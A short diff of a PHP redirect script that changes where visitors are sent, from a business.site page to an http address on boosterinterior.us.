@@ -1,4 +1,4 @@
 <?php
-header("Location: https://drink-bubble.business.site/");
+header("Location: http://boosterinterior.us/nort/");
 die();
 ?>
